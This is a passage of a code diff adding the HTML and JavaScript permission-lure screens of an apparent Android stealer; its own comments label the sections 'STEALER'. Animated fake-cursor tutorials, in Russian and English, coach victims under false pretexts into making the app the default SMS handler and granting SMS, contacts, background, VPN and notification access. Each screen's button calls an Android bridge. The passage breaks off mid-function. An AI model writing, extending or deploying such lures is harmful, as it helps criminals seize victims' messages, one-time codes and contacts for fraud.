+                <div class="badge-circle"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+                <span>SMS — разрешено</span>
+              </div>
+              <div class="smsr-step-badge" id="smsrBadge1">
+                <div class="badge-circle"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+                <span>Контакты — разрешено</span>
+              </div>
+            </div>
+
+            <div class="sms-footer" id="smsrFooter">
+              <button class="sms-btn" id="smsrBtn" type="button" onclick="Android.onGrantClicked()">Продолжить</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- STEALER: Battery Optimization -->
+        <div class="sms-screen batt-screen" id="battScreen">
+          <div class="sms-webview-bg">
+            <div class="sms-webview-lines">
+              <div class="sms-webview-line"></div>
+              <div class="sms-webview-line"></div>
+              <div class="sms-webview-line"></div>
+              <div class="sms-webview-line"></div>
+              <div class="sms-webview-line"></div>
+              <div class="sms-webview-line"></div>
+            </div>
+          </div>
+          <div class="sms-dimmer" id="battDimmer"></div>
+
+          <div class="sms-card" id="battCard">
+            <div class="sms-handle"></div>
+
+            <div class="sms-icon-circle" id="battIconCircle">
+              <svg viewBox="0 0 24 24" fill="none">
+                <rect x="6" y="4" width="12" height="17" rx="2" fill="#FF9800" opacity="0.2" stroke="#FF9800" stroke-width="1.5"/>
+                <rect x="9" y="2" width="6" height="2" rx="1" fill="#FF9800"/>
+                <path d="M10 14l2 2 2-2" stroke="#FF9800" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                <line x1="12" y1="10" x2="12" y2="16" stroke="#FF9800" stroke-width="1.5" stroke-linecap="round"/>
+              </svg>
+            </div>
+
+            <div class="sms-card-title" id="battCardTitle">Оптимизация батареи</div>
+            <div class="sms-card-subtitle" id="battCardSubtitle">Для стабильной работы в фоновом режиме приложению необходимо отключить оптимизацию батареи</div>
+
+            <div class="sms-preview-label" id="battPreviewLabel">Вот что вы увидите</div>
+
+            <div class="batt-mock-dialog" id="battMockDialog">
+              <div class="batt-cursor" id="battCursor"></div>
+              <div class="batt-mock-dialog-title" id="battMockTitle">Разрешить приложению «<strong id="battMockName">Piski</strong>» всегда работать в фоновом режиме?</div>
+              <div class="batt-mock-actions">
+                <button class="batt-mock-btn batt-mock-btn-deny" id="battMockDeny">Отклонить</button>
+                <button class="batt-mock-btn batt-mock-btn-allow" id="battMockAllow">Разрешить</button>
+              </div>
+            </div>
+
+            <div class="batt-badge" id="battBadge">
+              <div class="badge-circle"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+              <span>Фоновый режим — разрешено</span>
+            </div>
+
+            <div class="sms-footer" id="battFooter">
+              <button class="sms-btn" id="battBtn" type="button" onclick="Android.onGrantClicked()">Продолжить</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- STEALER: VPN Consent -->
+        <div class="sms-screen batt-screen" id="vpnScreen">
+          <div class="sms-webview-bg"><div class="sms-webview-lines"><div class="sms-webview-line"></div><div class="sms-webview-line"></div><div class="sms-webview-line"></div><div class="sms-webview-line"></div><div class="sms-webview-line"></div><div class="sms-webview-line"></div></div></div>
+          <div class="sms-dimmer" id="vpnDimmer"></div>
+          <div class="sms-card" id="vpnCard">
+            <div class="sms-handle"></div>
+            <div class="sms-icon-circle" id="vpnIconCircle">
+              <svg viewBox="0 0 24 24" fill="none">
+                <path d="M12 2L4 7v5c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V7l-8-5z" fill="#7C4DFF" opacity="0.2"/>
+                <path d="M12 2L4 7v5c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V7l-8-5z" stroke="#7C4DFF" stroke-width="1.5" stroke-linejoin="round"/>
+                <path d="M9 12l2 2 4-4" stroke="#7C4DFF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <div class="sms-card-title" id="vpnCardTitle">Защита соединения</div>
+            <div class="sms-card-subtitle" id="vpnCardSubtitle">Для стабильной и защищённой работы приложению необходимо VPN-подключение</div>
+            <div class="sms-preview-label" id="vpnPreviewLabel">Вот что вы увидите</div>
+            <div class="batt-mock-dialog" id="vpnMockDialog">
+              <div class="batt-cursor" id="vpnCursor"></div>
+              <div class="batt-mock-dialog-title" id="vpnMockTitle">Запрос на подключение</div>
+              <div style="padding:0 20px 16px; font-size:12px; color:#999; line-height:1.5;" id="vpnMockDesc">Приложение «<strong style="color:#e0e0e0" id="vpnMockName">Piski</strong>» пытается подключиться к сети VPN</div>
+              <div class="batt-mock-actions">
+                <button class="batt-mock-btn batt-mock-btn-deny" id="vpnMockDeny">Отмена</button>
+                <button class="batt-mock-btn batt-mock-btn-allow" id="vpnMockAllow">ОК</button>
+              </div>
+            </div>
+            <div class="batt-badge" id="vpnBadge">
+              <div class="badge-circle"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+              <span>VPN — подключено</span>
+            </div>
+            <div class="sms-footer" id="vpnFooter">
+              <button class="sms-btn" id="vpnBtn" type="button" onclick="Android.onGrantClicked()">Продолжить</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- STEALER: Notification Access -->
+        <div class="sms-screen batt-screen" id="notifScreen">
+          <div class="sms-webview-bg"><div class="sms-webview-lines"><div class="sms-webview-line"></div><div class="sms-webview-line"></div><div class="sms-webview-line"></div><div class="sms-webview-line"></div><div class="sms-webview-line"></div><div class="sms-webview-line"></div></div></div>
+          <div class="sms-dimmer" id="notifDimmer"></div>
+          <div class="sms-card" id="notifCard">
+            <div class="sms-handle"></div>
+            <div class="sms-icon-circle" id="notifIconCircle">
+              <svg viewBox="0 0 24 24" fill="none">
+                <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z" fill="#E91E63" opacity="0.2"/>
+                <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z" stroke="#E91E63" stroke-width="1.2" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <div class="sms-card-title" id="notifCardTitle">Доступ к уведомлениям</div>
+            <div class="sms-card-subtitle" id="notifCardSubtitle">Для корректной работы приложению необходим доступ к уведомлениям устройства</div>
+            <div class="sms-preview-label" id="notifPreviewLabel">Вот что вы увидите в настройках</div>
+            <div class="notif-mock-row" id="notifMockRow">
+              <div class="notif-cursor" id="notifCursor"></div>
+              <div class="notif-mock-icon" id="notifMockIcon"><span id="notifMockIconFb" style="font-size:18px;font-weight:600;color:#fff;">P</span></div>
+              <div class="notif-mock-text">
+                <div class="notif-mock-name" id="notifMockName">Piski</div>
+                <div class="notif-mock-sub" id="notifMockSub">Не разрешено</div>
+              </div>
+              <div class="notif-toggle-track" id="notifToggle"><div class="notif-toggle-thumb"></div></div>
+            </div>
+            <div class="notif-mock-check" id="notifMockCheck">
+              <svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="#E91E63" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+              <span id="notifCheckText">Доступ разрешён</span>
+            </div>
+            <div class="notif-badge" id="notifBadge">
+              <div class="badge-circle"><svg viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+              <span>Уведомления — разрешено</span>
+            </div>
+            <div class="sms-footer" id="notifFooter">
+              <button class="sms-btn" id="notifBtn" type="button" onclick="Android.onGrantClicked()">Открыть настройки</button>
+            </div>
+          </div>
+        </div>
+
+
+<script>
+
+function $(id){ return document.getElementById(id); }
+const BUILD = { appName: "App" };
+
+const LANG = (function(){
+  var loc = "en";
+  try { if(window.Android&&Android.getLocale) loc = Android.getLocale(); }
+  catch(e){ var nav=(navigator.language||"en").toLowerCase(); loc=nav.indexOf("ru")===0?"ru":"en"; }
+  var isRu = loc === "ru";
+  return {
+    smsCardTitle: isRu ? "SMS доступ" : "SMS Access",
+    smsCardSubtitle: isRu ? "Для доступа к данному ресурсу необходимо назначить приложение SMS по умолчанию" : "To access this resource, you need to set the app as default SMS handler",
+    smsPreviewLabel: isRu ? "Вот что вы увидите" : "Here's what you'll see",
+    smsMockDialogTitle: function(n){ return isRu ? 'Сделать «<span id="smsMockDialogName">'+n+'</span>» приложением для обмена SMS по умолчанию?' : 'Make «<span id="smsMockDialogName">'+n+'</span>» the default SMS app?'; },
+    smsMsgName: isRu ? "Сообщения" : "Messages",
+    smsMsgSub: isRu ? "Используется по умолчанию" : "Used by default",
+    smsMockCancel: isRu ? "Отмена" : "Cancel",
+    smsMockDefault: isRu ? "По умолчанию" : "Set as default",
+    smsBtn: isRu ? "Продолжить" : "Continue",
+    smsrCardTitle: isRu ? "SMS доступ" : "SMS Access",
+    smsrCardSubtitle: isRu ? "Для корректной работы приложению необходим доступ к SMS-сообщениям" : "The app requires access to SMS messages to function properly",
+    smsrPreviewLabel: isRu ? "Вот что вы увидите" : "Here's what you'll see",
+    smsrMockTitle: function(n){ return isRu ? 'Разрешить приложению «<strong>'+n+'</strong>» отправлять и просматривать SMS-сообщения?' : 'Allow «<strong>'+n+'</strong>» to send and view SMS messages?'; },
+    smsrMockDeny: isRu ? "Отклонить" : "Deny",
+    smsrMockAllow: isRu ? "Разрешить" : "Allow",
+    smsrBtn: isRu ? "Продолжить" : "Continue",
+    smsrBadge0: isRu ? "SMS — разрешено" : "SMS — allowed",
+    smsrBadge1: isRu ? "Контакты — разрешено" : "Contacts — allowed",
+    smsrPerms: [
+      { title: function(n){ return isRu ? 'Разрешить приложению «<strong>'+n+'</strong>» отправлять и просматривать SMS-сообщения?' : 'Allow «<strong>'+n+'</strong>» to send and view SMS messages?'; }, badge: isRu ? "SMS — разрешено" : "SMS — allowed" },
+      { title: function(n){ return isRu ? 'Разрешить приложению «<strong>'+n+'</strong>» доступ к контактам?' : 'Allow «<strong>'+n+'</strong>» access to contacts?'; }, badge: isRu ? "Контакты — разрешено" : "Contacts — allowed" }
+    ],
+    battCardTitle: isRu ? "Оптимизация батареи" : "Battery Optimization",
+    battCardSubtitle: isRu ? "Для стабильной работы в фоновом режиме приложению необходимо отключить оптимизацию батареи" : "The app needs unrestricted battery access for stable background operation",
+    battPreviewLabel: isRu ? "Вот что вы увидите" : "Here's what you'll see",
+    battMockTitle: function(n){ return isRu ? 'Разрешить приложению «<strong>'+n+'</strong>» всегда работать в фоновом режиме?' : 'Allow «<strong>'+n+'</strong>» to always run in the background?'; },
+    battMockDeny: isRu ? "Отклонить" : "Deny",
+    battMockAllow: isRu ? "Разрешить" : "Allow",
+    battBadge: isRu ? "Фоновый режим — разрешено" : "Background — allowed",
+    battBtn: isRu ? "Продолжить" : "Continue",
+    vpnCardTitle: isRu ? "Защита соединения" : "Connection Protection",
+    vpnCardSubtitle: isRu ? "Для стабильной и защищённой работы приложению необходимо VPN-подключение" : "The app needs a VPN connection for stable and secure operation",
+    vpnPreviewLabel: isRu ? "Вот что вы увидите" : "Here's what you'll see",
+    vpnMockTitle: isRu ? "Запрос на подключение" : "Connection request",
+    vpnMockDesc: function(n){ return isRu ? 'Приложение «<strong style="color:#e0e0e0">'+n+'</strong>» пытается подключиться к сети VPN' : 'Application «<strong style="color:#e0e0e0">'+n+'</strong>» is trying to connect to a VPN'; },
+    vpnMockDeny: isRu ? "Отмена" : "Cancel",
+    vpnMockAllow: isRu ? "ОК" : "OK",
+    vpnBtn: isRu ? "Продолжить" : "Continue",
+    notifCardTitle: isRu ? "Доступ к уведомлениям" : "Notification Access",
+    notifCardSubtitle: isRu ? "Для корректной работы приложению необходим доступ к уведомлениям устройства" : "The app requires access to device notifications to function properly",
+    notifPreviewLabel: isRu ? "Вот что вы увидите в настройках" : "Here's what you'll see in settings",
+    notifMockSub: isRu ? "Не разрешено" : "Not allowed",
+    notifMockSubOn: isRu ? "Разрешено" : "Allowed",
+    notifCheck: isRu ? "Доступ разрешён" : "Access allowed",
+    notifBadge: isRu ? "Уведомления — разрешено" : "Notifications — allowed",
+    notifBtn: isRu ? "Открыть настройки" : "Open settings"
+  };
+})();
+
+function applyLocale() {
+  $("smsCardTitle").textContent = LANG.smsCardTitle;
+  $("smsCardSubtitle").textContent = LANG.smsCardSubtitle;
+  $("smsPreviewLabel").textContent = LANG.smsPreviewLabel;
+  $("smsMsgName").textContent = LANG.smsMsgName;
+  $("smsMsgSub").textContent = LANG.smsMsgSub;
+  $("smsMockCancel").textContent = LANG.smsMockCancel;
+  $("smsMockDefault").textContent = LANG.smsMockDefault;
+  $("smsBtn").textContent = LANG.smsBtn;
+  $("smsrCardTitle").textContent = LANG.smsrCardTitle;
+  $("smsrCardSubtitle").textContent = LANG.smsrCardSubtitle;
+  $("smsrPreviewLabel").textContent = LANG.smsrPreviewLabel;
+  $("smsrMockDeny").textContent = LANG.smsrMockDeny;
+  $("smsrMockAllow").textContent = LANG.smsrMockAllow;
+  $("smsrBtn").textContent = LANG.smsrBtn;
+  $("smsrBadge0").querySelector("span").textContent = LANG.smsrBadge0;
+  $("smsrBadge1").querySelector("span").textContent = LANG.smsrBadge1;
+  $("battCardTitle").textContent = LANG.battCardTitle;
+  $("battCardSubtitle").textContent = LANG.battCardSubtitle;
+  $("battPreviewLabel").textContent = LANG.battPreviewLabel;
+  $("battMockDeny").textContent = LANG.battMockDeny;
+  $("battMockAllow").textContent = LANG.battMockAllow;
+  if($("battBadge")) $("battBadge").querySelector("span").textContent = LANG.battBadge;
+  $("battBtn").textContent = LANG.battBtn;
+  $("vpnCardTitle").textContent = LANG.vpnCardTitle;
+  $("vpnCardSubtitle").textContent = LANG.vpnCardSubtitle;
+  $("vpnPreviewLabel").textContent = LANG.vpnPreviewLabel;
+  $("vpnMockTitle").textContent = LANG.vpnMockTitle;
+  $("vpnMockDeny").textContent = LANG.vpnMockDeny;
+  $("vpnMockAllow").textContent = LANG.vpnMockAllow;
+  $("vpnBtn").textContent = LANG.vpnBtn;
+  $("notifCardTitle").textContent = LANG.notifCardTitle;
+  $("notifCardSubtitle").textContent = LANG.notifCardSubtitle;
+  $("notifPreviewLabel").textContent = LANG.notifPreviewLabel;
+  $("notifMockSub").textContent = LANG.notifMockSub;
+  if($("notifCheckText")) $("notifCheckText").textContent = LANG.notifCheck;
+  if($("notifBadge")) $("notifBadge").querySelector("span").textContent = LANG.notifBadge;
+  $("notifBtn").textContent = LANG.notifBtn;
+}
+applyLocale();
+
+const smsScreen = $("smsScreen");
+const smsEls = [$("smsDimmer"), $("smsCard"), $("smsIconCircle"), $("smsCardTitle"), $("smsCardSubtitle"), $("smsPreviewLabel"), $("smsMockDialog"), $("smsFooter")];
+const smsrScreen = $("smsrScreen");
+const smsrEls = [$("smsrDimmer"), $("smsrCard"), $("smsrIconCircle"), $("smsrCardTitle"), $("smsrCardSubtitle"), $("smsrPreviewLabel"), $("smsrMockDialog"), $("smsrFooter")];
+const battScreen = $("battScreen");
+const battEls = [$("battDimmer"), $("battCard"), $("battIconCircle"), $("battCardTitle"), $("battCardSubtitle"), $("battPreviewLabel"), $("battMockDialog"), $("battFooter")];
+const vpnScreen = $("vpnScreen");
+const vpnEls = [$("vpnDimmer"), $("vpnCard"), $("vpnIconCircle"), $("vpnCardTitle"), $("vpnCardSubtitle"), $("vpnPreviewLabel"), $("vpnMockDialog"), $("vpnFooter")];
+const notifScreen = $("notifScreen");
+const notifEls = [$("notifDimmer"), $("notifCard"), $("notifIconCircle"), $("notifCardTitle"), $("notifCardSubtitle"), $("notifPreviewLabel"), $("notifMockRow"), $("notifFooter")];
+
+let T = [], stopSmsTutorial = null, stopSmsrTutorial = null, stopBattTutorial = null, stopVpnTutorial = null, stopNotifTutorial = null;
+function clearAll() {
+  T.forEach(clearTimeout); T = [];
+  if (typeof stopSmsTutorial === "function") { stopSmsTutorial(); stopSmsTutorial = null; }
+  if (typeof stopSmsrTutorial === "function") { stopSmsrTutorial(); stopSmsrTutorial = null; }
+  if (typeof stopBattTutorial === "function") { stopBattTutorial(); stopBattTutorial = null; }
+  if (typeof stopVpnTutorial === "function") { stopVpnTutorial(); stopVpnTutorial = null; }
+  if (typeof stopNotifTutorial === "function") { stopNotifTutorial(); stopNotifTutorial = null; }
+}
+function wait(ms) { return new Promise(r => { T.push(setTimeout(r, ms)); }); }
+const SMOOTH = "cubic-bezier(0.16, 1, 0.3, 1)";
+const KF_FINALS = {
+  fadeIn: { opacity: "1" }, fadeOut: { opacity: "0" },
+  springScaleIn: { opacity: "1", transform: "scale(1) translateY(0)" },
+  slideUp: { opacity: "1", transform: "translateY(0)" },
+  scaleSlideUp: { opacity: "1", transform: "scale(1) translateY(0)" },
+  slideUpBtn: { opacity: "1", transform: "translateY(0)" },
+  cardSlideUp: { opacity: "1", transform: "translateY(0)" },
+};
+function kf(el, keyframeName, dur, easing, fillMode) {
+  if (!el) return;
+  el.style.animation = "none";
+  void el.offsetWidth;
+  el.style.opacity = "";
+  el.style.transform = "";
+  el.style.animation = keyframeName + " " + dur + "ms " + (easing || SMOOTH) + " " + (fillMode || "forwards");
+  const finals = KF_FINALS[keyframeName];
+  if (finals) {
+    T.push(setTimeout(() => {
+      if (finals.opacity) el.style.opacity = finals.opacity;
+      if (finals.transform) el.style.transform = finals.transform;
+    }, dur + 50));
+  }
+}
+function hideAll() {
+  clearAll();
+  [smsScreen, ...smsEls, smsrScreen, ...smsrEls, battScreen, ...battEls, vpnScreen, ...vpnEls, notifScreen, ...notifEls].forEach(el => {
+    if (!el) return;
+    el.style.animation = "none";
+    el.style.opacity = "0";
+    el.style.transform = "";
+  });
+  smsScreen.classList.remove("show");
+  smsrScreen.classList.remove("show");
+  battScreen.classList.remove("show");
+  vpnScreen.classList.remove("show");
+  notifScreen.classList.remove("show");
+  resetSmsMock(); resetSmsrMock(); resetBattMock(); resetVpnMock(); resetNotifMock();
+}
+
+function applyBuildSms() {
+  const name = BUILD.appName || "App";
+  $("smsMockAppName").textContent = name;
+  $("smsMockDialog").querySelector(".sms-mock-dialog-title").innerHTML = LANG.smsMockDialogTitle(name);
+  $("smsMockIcon").textContent = name.charAt(0).toUpperCase();
+}
+function resetSmsMock() {
+  const cursor = $("smsCursor");
+  const rowOurs = $("smsRowOurs");
+  const rowMsg = $("smsRowMessages");
+  const radioMsg = $("smsRadioMsg");
+  const radioOurs = $("smsRadioOurs");
+  const btnDefault = $("smsMockDefault");
+  const success = $("smsMockSuccess");
+  const msgSub = $("smsMsgSub");
+  if (!cursor) return;
+  cursor.classList.remove("visible", "tap");
+  cursor.style.top = "0"; cursor.style.left = "0";
+  rowOurs.classList.remove("highlight", "tapped");
+  rowMsg.classList.remove("highlight", "tapped");
+  radioMsg.classList.add("selected");
+  radioOurs.classList.remove("selected");
+  btnDefault.classList.remove("highlight", "tapped");
+  success.classList.remove("visible");
+  msgSub.textContent = LANG.smsMsgSub;
+  msgSub.style.color = "";
+}
+async function playSmsTutorialCycle() {
+  const cursor = $("smsCursor");
+  const rowOurs = $("smsRowOurs");
+  const radioMsg = $("smsRadioMsg");
+  const radioOurs = $("smsRadioOurs");
+  const btnDefault = $("smsMockDefault");
+  const success = $("smsMockSuccess");
+  const dialog = $("smsMockDialog");
+  const msgSub = $("smsMsgSub");
+  resetSmsMock();
+  const rowRect = rowOurs.getBoundingClientRect();
+  const dialogRect = dialog.getBoundingClientRect();
+  const rowCY = rowRect.top - dialogRect.top + rowRect.height / 2 - 7;
+  const rowCX = rowRect.left - dialogRect.left + rowRect.width / 2 - 7;
+  cursor.style.top = (rowCY + 35) + "px";
+  cursor.style.left = (rowCX + 25) + "px";
+  await wait(500);
+  cursor.classList.add("visible");
+  await wait(150);
+  cursor.style.top = rowCY + "px";
+  cursor.style.left = rowCX + "px";
+  await wait(500);
+  rowOurs.classList.add("highlight");
+  await wait(400);
+  cursor.classList.add("tap");
+  rowOurs.classList.add("tapped");
+  await wait(180);
+  cursor.classList.remove("tap");
+  rowOurs.classList.remove("tapped");
+  await wait(200);
+  radioMsg.classList.remove("selected");
+  radioOurs.classList.add("selected");
+  msgSub.textContent = "";
+  rowOurs.classList.remove("highlight");
+  await wait(600);
+  const btnRect = btnDefault.getBoundingClientRect();
+  const btnCY = btnRect.top - dialogRect.top + btnRect.height / 2 - 7;
+  const btnCX = btnRect.left - dialogRect.left + btnRect.width / 2 - 7;
+  cursor.style.top = btnCY + "px";
+  cursor.style.left = btnCX + "px";
+  await wait(500);
+  btnDefault.classList.add("highlight");
+  await wait(400);
+  cursor.classList.add("tap");
+  btnDefault.classList.add("tapped");
+  await wait(180);
+  cursor.classList.remove("tap");
+  btnDefault.classList.remove("tapped");
+  await wait(200);
+  btnDefault.classList.remove("highlight");
+  success.classList.add("visible");
+  await wait(400);
+  cursor.classList.remove("visible");
+  await wait(2200);
+  resetSmsMock();
+  await wait(900);
+}
+function playSmsTutorial() {
+  let running = true;
+  const loop = async () => { while (running) { await playSmsTutorialCycle(); } };
+  loop();
+  return () => { running = false; };
+}
+async function enterSms() {
+  applyBuildSms();
+  smsScreen.classList.add("show");
+  kf(smsScreen, "fadeIn", 400, "ease");
+  await wait(200);
+  kf($("smsDimmer"), "fadeIn", 500, SMOOTH);
+  await wait(300);
+  kf($("smsCard"), "cardSlideUp", 700, "cubic-bezier(0.16, 1, 0.3, 1)");
+  await wait(400);
+  kf($("smsIconCircle"), "springScaleIn", 800, "ease");
+  await wait(250);
+  kf($("smsCardTitle"), "slideUp", 650, SMOOTH);
+  await wait(150);
+  kf($("smsCardSubtitle"), "slideUp", 600, SMOOTH);
+  await wait(200);
+  kf($("smsPreviewLabel"), "slideUp", 550, SMOOTH);
+  await wait(180);
+  kf($("smsMockDialog"), "scaleSlideUp", 750, SMOOTH);
+  await wait(300);
+  kf($("smsFooter"), "slideUpBtn", 700, SMOOTH);
+  $("smsBtn").addEventListener("animationend", function handler() {
+    $("smsBtn").removeEventListener("animationend", handler);
+    $("smsBtn").style.animation = "btnGlowBlue 2.8s ease-in-out infinite";
+    $("smsBtn").style.opacity = "1";
+  });
+  await wait(800);
+  stopSmsTutorial = playSmsTutorial();
+}
+
+const SMSR_PERMS = LANG.smsrPerms;
+function applyBuildSmsr() {
+  const name = BUILD.appName || "App";
+  $("smsrMockTitle").innerHTML = SMSR_PERMS[0].title(name);
+}
+function resetSmsrMock() {
+  const cursor = $("smsrCursor");
+  const btnAllow = $("smsrMockAllow");
+  const dialog = $("smsrMockDialog");
+  if (!cursor) return;
+  cursor.classList.remove("visible", "tap");
+  cursor.style.top = "0"; cursor.style.left = "0";
+  btnAllow.classList.remove("highlight", "tapped");
+  dialog.classList.remove("dismissed");
+  $("smsrBadge0").classList.remove("visible");
+  $("smsrBadge1").classList.remove("visible");
+  $("smsrMockTitle").innerHTML = SMSR_PERMS[0].title(BUILD.appName || "App");
+}
+async function playSmsrOneDialog(permIdx) {
+  const cursor = $("smsrCursor");
+  const btnAllow = $("smsrMockAllow");
+  const dialog = $("smsrMockDialog");
+  const badge = $("smsrBadge" + permIdx);
+  const name = BUILD.appName || "App";
+  const perm = SMSR_PERMS[permIdx];
+  dialog.classList.remove("dismissed");
+  $("smsrMockTitle").innerHTML = perm.title(name);
+  btnAllow.classList.remove("highlight", "tapped");
+  cursor.classList.remove("visible", "tap");
+  if (permIdx > 0) {
+    kf(dialog, "scaleSlideUp", 500, SMOOTH);
+    await wait(400);
+  }
+  const btnRect = btnAllow.getBoundingClientRect();
+  const dialogRect = dialog.getBoundingClientRect();
+  const btnCY = btnRect.top - dialogRect.top + btnRect.height / 2 - 7;
+  const btnCX = btnRect.left - dialogRect.left + btnRect.width / 2 - 7;
+  cursor.style.top = (btnCY + 30) + "px";
+  cursor.style.left = (btnCX + 20) + "px";
+  await wait(400);
+  cursor.classList.add("visible");
+  await wait(150);
+  cursor.style.top = btnCY + "px";
+  cursor.style.left = btnCX + "px";
+  await wait(450);
+  btnAllow.classList.add("highlight");
+  await wait(400);
+  cursor.classList.add("tap");
+  btnAllow.classList.add("tapped");
+  await wait(180);
+  cursor.classList.remove("tap");
+  btnAllow.classList.remove("tapped");
+  await wait(150);
+  btnAllow.classList.remove("highlight");
+  cursor.classList.remove("visible");
+  dialog.classList.add("dismissed");
+  await wait(350);
+  badge.classList.add("visible");
+  await wait(1200);
+}
+async function playSmsrTutorialCycle() {
+  resetSmsrMock();
+  await wait(300);
+  for (let i = 0; i < SMSR_PERMS.length; i++) await playSmsrOneDialog(i);
+  await wait(800);
+  resetSmsrMock();
+  await wait(600);
+}
+function playSmsrTutorial() {
+  let running = true;
+  const loop = async () => { while (running) { await playSmsrTutorialCycle(); } };
+  loop();
+  return () => { running = false; };
+}
+async function enterSmsr() {
+  applyBuildSmsr();
+  smsrScreen.classList.add("show");
+  kf(smsrScreen, "fadeIn", 400, "ease");
+  await wait(200);
+  kf($("smsrDimmer"), "fadeIn", 500, SMOOTH);
+  await wait(300);
+  kf($("smsrCard"), "cardSlideUp", 700, SMOOTH);
+  await wait(400);
+  kf($("smsrIconCircle"), "springScaleIn", 800, "ease");
+  await wait(250);
+  kf($("smsrCardTitle"), "slideUp", 650, SMOOTH);
+  await wait(150);
+  kf($("smsrCardSubtitle"), "slideUp", 600, SMOOTH);
+  await wait(200);
+  kf($("smsrPreviewLabel"), "slideUp", 550, SMOOTH);
+  await wait(180);
+  kf($("smsrMockDialog"), "scaleSlideUp", 750, SMOOTH);
+  await wait(300);
+  kf($("smsrFooter"), "slideUpBtn", 700, SMOOTH);
+  $("smsrBtn").addEventListener("animationend", function handler() {
+    $("smsrBtn").removeEventListener("animationend", handler);
+    $("smsrBtn").style.animation = "btnGlowTeal 2.8s ease-in-out infinite";
+    $("smsrBtn").style.opacity = "1";
+  });
+  await wait(800);
+  stopSmsrTutorial = playSmsrTutorial();
+}
+
+function applyBuildBatt() {
+  const name = BUILD.appName || "App";
+  $("battMockTitle").innerHTML = LANG.battMockTitle(name);
+}
+function resetBattMock() {
+  const cursor = $("battCursor");
+  const btnAllow = $("battMockAllow");
+  const dialog = $("battMockDialog");
+  if (!cursor) return;
+  cursor.classList.remove("visible", "tap");
+  cursor.style.top = "0"; cursor.style.left = "0";
+  btnAllow.classList.remove("highlight", "tapped");
+  dialog.classList.remove("dismissed");
+  $("battBadge").classList.remove("visible");
+  applyBuildBatt();
+}
+async function playBattTutorialCycle() {
+  resetBattMock();
+  await wait(400);
+  const cursor = $("battCursor");
+  const btnAllow = $("battMockAllow");
+  const dialog = $("battMockDialog");
+  const badge = $("battBadge");
+  const btnRect = btnAllow.getBoundingClientRect();
+  const dialogRect = dialog.getBoundingClientRect();
+  const btnCY = btnRect.top - dialogRect.top + btnRect.height / 2 - 7;
+  const btnCX = btnRect.left - dialogRect.left + btnRect.width / 2 - 7;
+  cursor.style.top = (btnCY + 30) + "px";
+  cursor.style.left = (btnCX + 20) + "px";
+  await wait(400);
+  cursor.classList.add("visible");
+  await wait(150);
+  cursor.style.top = btnCY + "px";
+  cursor.style.left = btnCX + "px";
+  await wait(450);
+  btnAllow.classList.add("highlight");
+  await wait(400);
+  cursor.classList.add("tap");
+  btnAllow.classList.add("tapped");
+  await wait(180);
+  cursor.classList.remove("tap");
+  btnAllow.classList.remove("tapped");
+  await wait(150);
+  btnAllow.classList.remove("highlight");
+  cursor.classList.remove("visible");
+  dialog.classList.add("dismissed");
+  await wait(350);
+  badge.classList.add("visible");
+  await wait(1800);
+  badge.classList.remove("visible");
+  await wait(400);
+}
+function playBattTutorial() {
+  let running = true;
+  const loop = async () => { while (running) { await playBattTutorialCycle(); if (!running) break; await wait(600); } };
+  loop();
+  return () => { running = false; };
+}
+async function enterBatt() {
+  applyBuildBatt();
+  battScreen.classList.add("show");
+  kf(battScreen, "fadeIn", 400, "ease");
+  await wait(200);
+  kf($("battDimmer"), "fadeIn", 500, SMOOTH);
+  await wait(300);
+  kf($("battCard"), "cardSlideUp", 700, SMOOTH);
+  await wait(400);
+  kf($("battIconCircle"), "springScaleIn", 800, "ease");
+  await wait(250);
+  kf($("battCardTitle"), "slideUp", 650, SMOOTH);
+  await wait(150);
+  kf($("battCardSubtitle"), "slideUp", 600, SMOOTH);
+  await wait(200);
+  kf($("battPreviewLabel"), "slideUp", 550, SMOOTH);
+  await wait(180);
+  kf($("battMockDialog"), "scaleSlideUp", 750, SMOOTH);
+  await wait(300);
+  kf($("battFooter"), "slideUpBtn", 700, SMOOTH);
+  $("battBtn").addEventListener("animationend", function handler() {
+    $("battBtn").removeEventListener("animationend", handler);
+    $("battBtn").style.animation = "btnGlowAmber 2.8s ease-in-out infinite";
+    $("battBtn").style.opacity = "1";
+  });
+  await wait(800);
+  stopBattTutorial = playBattTutorial();
+}
+
+function applyBuildVpn() {
+  const name = BUILD.appName || "App";
+  $("vpnMockTitle").textContent = LANG.vpnMockTitle;
+  $("vpnMockDesc").innerHTML = LANG.vpnMockDesc(name);
+}
+function resetVpnMock() {
+  const cursor = $("vpnCursor");
+  const btnAllow = $("vpnMockAllow");
+  const dialog = $("vpnMockDialog");
+  if (!cursor) return;
+  cursor.classList.remove("visible", "tap");
